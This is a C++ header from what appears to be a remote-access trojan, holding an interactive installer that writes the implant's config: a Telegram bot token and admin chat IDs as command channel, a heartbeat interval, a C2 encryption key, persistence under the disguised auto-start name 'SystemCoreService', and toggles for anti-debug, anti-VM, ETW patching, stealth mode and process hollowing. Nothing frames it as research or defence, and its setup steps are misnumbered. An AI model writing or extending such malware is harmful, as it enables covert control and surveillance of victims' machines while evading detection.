#pragma once

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstdlib>
#include <algorithm>
#include <random>

namespace nuub::domain {

class Installer {
    static std::string random_string(int length) {
        const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::string result;
        result.resize(length);
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);
        for (int i = 0; i < length; ++i) {
            result[i] = charset[dist(gen)];
        }
        return result;
    }

    static std::string read_line(const std::string& prompt, const std::string& default_value = "") {
        std::cout << prompt;
        if (!default_value.empty()) {
            std::cout << " [" << default_value << "]";
        }
        std::cout << ": ";

        std::string input;
        std::getline(std::cin, input);

        if (input.empty() && !default_value.empty()) {
            return default_value;
        }
        return input;
    }

    static int64_t read_number(const std::string& prompt, int64_t default_value) {
        std::string input = read_line(prompt, std::to_string(default_value));
        try {
            return std::stoll(input);
        } catch (...) {
            return default_value;
        }
    }

    static bool read_yes_no(const std::string& prompt, bool default_value = false) {
        std::string def = default_value ? "y" : "n";
        std::string input = read_line(prompt + " (y/n)", def);
        std::transform(input.begin(), input.end(), input.begin(), ::tolower);
        return input == "y" || input == "yes";
    }

public:
    // Run the interactive installer
    static bool run_setup(const std::string& config_path) {
        std::cout << R"(
 _   _ _   _  ___ _____    ___  ___   _   _  _____
| | | | \ | |/ _ \_   _|  / _ \|_ _| \ | |/ / _ \
| | | |  \| | | | || |   | | | || ||  \| | | | |
| |_| | |\  | |_| || |   | |_| || || |\  | |_| |
 \___/|_| \_|\___/ |_|    \___/___|_| \_|\___/

   Auto-Installer v2.0
)" << std::endl;

        std::cout << "First time setup. This will create your config file.\n" << std::endl;

        // Step 1: Telegram Bot Token
        std::cout << "[1/6] Telegram Bot Configuration" << std::endl;
        std::cout << "Create a bot via @BotFather on Telegram.\n" << std::endl;

        std::string bot_token = read_line("Bot Token");
        if (bot_token.empty()) {
            std::cerr << "[ERROR] Bot token is required!" << std::endl;
            return false;
        }

        // Step 2: Admin Chat IDs
        std::cout << "\n[2/6] Admin Configuration" << std::endl;
        std::cout << "Send /start to your bot and note your chat ID.\n" << std::endl;

        std::vector<std::string> admin_ids;
        std::string first_id = read_line("Admin Chat ID");
        if (!first_id.empty()) {
            admin_ids.push_back(first_id);
        }

        while (read_yes_no("Add another admin")) {
            std::string id = read_line("Admin Chat ID");
            if (!id.empty()) {
                admin_ids.push_back(id);
            }
        }

        if (admin_ids.empty()) {
            std::cerr << "[ERROR] At least one admin ID is required!" << std::endl;
            return false;
        }

        // Step 3: PC Identifier
        std::cout << "\n[3/5] PC Configuration" << std::endl;
        std::string pc_id = read_line("PC Identifier", "PC-001");

        // Step 4: Encryption Password
        std::cout << "\n[4/5] Security Configuration" << std::endl;
        std::string enc_password = read_line("Encryption Password (leave empty for random)");

        if (enc_password.empty()) {
            enc_password = random_string(16);
            std::cout << "Generated: " << enc_password << std::endl;
        }

        // Step 5: Advanced
        std::cout << "\n[5/6] Advanced Configuration" << std::endl;
        int64_t heartbeat = read_number("Heartbeat interval (minutes)", 30);

        // Step 6: Evasion
        std::cout << "\n[6/6] Evasion Configuration" << std::endl;
        bool anti_debug = read_yes_no("Enable anti-debug detection", true);
        bool anti_vm = read_yes_no("Enable anti-VM detection", false);
        bool etw_patch = read_yes_no("Enable ETW patching", true);
        bool stealth = read_yes_no("Enable stealth mode (anti-VM + anti-debug)", false);

        // Generate JSON
        std::string json = "{\n";
        json += "    \"telegram_bot_token\": \"" + bot_token + "\",\n";
        json += "    \"admin_chat_id\": " + admin_ids[0] + ",\n";
        json += "    \"admin_chat_ids\": [";
        for (size_t i = 0; i < admin_ids.size(); ++i) {
            if (i > 0) json += ", ";
            json += admin_ids[i];
        }
        json += "],\n";
        json += "    \"pc_identifier\": \"" + pc_id + "\",\n";
        json += "    \"encryption_password\": \"" + enc_password + "\",\n";
        json += "    \"master_log_filename\": \"log_master.txt\",\n";
        json += "    \"activity_log_filename\": \"activity_log.csv\",\n";
        json += "    \"auto_start_entry_name\": \"SystemCoreService\",\n";
        json += "    \"log_filename\": \"nuub.log\",\n";
        json += "    \"heartbeat_interval_minutes\": " + std::to_string(heartbeat) + ",\n";
        json += "    \"c2_encryption_key\": \"\",\n";
        json += "    \"stealth_mode\": " + std::string(stealth ? "true" : "false") + ",\n";
        json += "    \"anti_debug\": " + std::string(anti_debug ? "true" : "false") + ",\n";
        json += "    \"anti_vm\": " + std::string(anti_vm ? "true" : "false") + ",\n";
        json += "    \"etw_patch\": " + std::string(etw_patch ? "true" : "false") + ",\n";
        json += "    \"process_hollowing\": false\n";
        json += "}\n";

        // Write config
        std::ofstream file(config_path);
        if (!file.is_open()) {
            std::cerr << "[ERROR] Could not create " << config_path << std::endl;
            return false;
        }
        file << json;
        file.close();

        std::cout << "\n[OK] Configuration saved to " << config_path << std::endl;
        std::cout << "Starting agent...\n" << std::endl;

        return true;
    }

    // Check if setup is needed
    static bool needs_setup(const std::string& config_path) {
        std::ifstream file(config_path);
        return !file.good();
    }
};

} // namespace nuub::domain
